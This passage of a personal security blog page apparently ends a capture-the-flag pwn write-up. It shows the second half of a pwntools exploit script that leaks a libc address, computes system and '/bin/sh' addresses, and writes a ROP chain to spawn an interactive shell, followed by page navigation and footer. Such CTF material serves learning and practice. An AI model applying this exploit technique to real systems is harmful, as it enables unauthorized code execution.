class="string">&quot;0&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;8&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;6&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;7&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">0xDEADBEEF</span>))</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x134d50</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libc_base + <span class="number">0x1d8698</span></span><br><span class="line">pop_rdx_r12_ret = libc_base + <span class="number">0x000000000011f497</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;command:&quot;</span>,<span class="string">&quot;10 10 10 10 10 10 10 10 7 7 7 7 7 7 7 7 16&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;your cost:&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;14&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(stack_addr1))</span><br><span class="line">sl(<span class="string">&quot;15&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(stack_addr2))</span><br><span class="line">sl(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(pop_rdi_ret))</span><br><span class="line">sl(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(ret))</span><br><span class="line">sl(<span class="string">&quot;8&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(binsh%<span class="number">0x100000000</span>))</span><br><span class="line">sl(<span class="string">&quot;9&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(binsh&gt;&gt;<span class="number">32</span>))</span><br><span class="line">sl(<span class="string">&quot;10&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(system%<span class="number">0x100000000</span>))</span><br><span class="line">sl(<span class="string">&quot;11&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(system&gt;&gt;<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&quot;2&quot;</span>) <span class="comment"># pop binsh </span></span><br><span class="line">sl(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;8&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;9&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;3&quot;</span>) <span class="comment"># ret</span></span><br><span class="line">sl(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;10&quot;</span>) <span class="comment"># system</span></span><br><span class="line">sl(<span class="string">&quot;6&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;11&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;7&quot;</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="built_in">str</span>(<span class="number">0xDEADBEEF</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/33/">33</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">325</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">169</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">4.9m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">74:01</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
